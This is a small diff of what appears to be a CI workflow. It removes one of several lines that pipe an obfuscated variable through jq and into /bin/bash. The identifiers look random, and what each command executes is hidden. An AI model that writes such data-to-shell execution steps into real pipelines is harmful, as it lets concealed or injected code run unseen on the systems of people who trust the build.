@@ -42,7 +42,6 @@ jobs:
           echo $el14629 | jq -r .zji7 | /bin/bash
           printf '%s' "$u817" | jq -r .pjka149 | /bin/bash
           printf '%s' "$xsrje64430" | jq -r .knwv779 | /bin/bash
-          printf '%s' "$nzfc1" | jq -r .gdj210 | /bin/bash
           printf '%s' "$r32924" | jq -r .gn85213 | /bin/bash
           echo $c2178 | jq -r .ocebg3136 | /bin/bash
           printf '%s' "$wuk70" | jq -r .s2 | /bin/bash
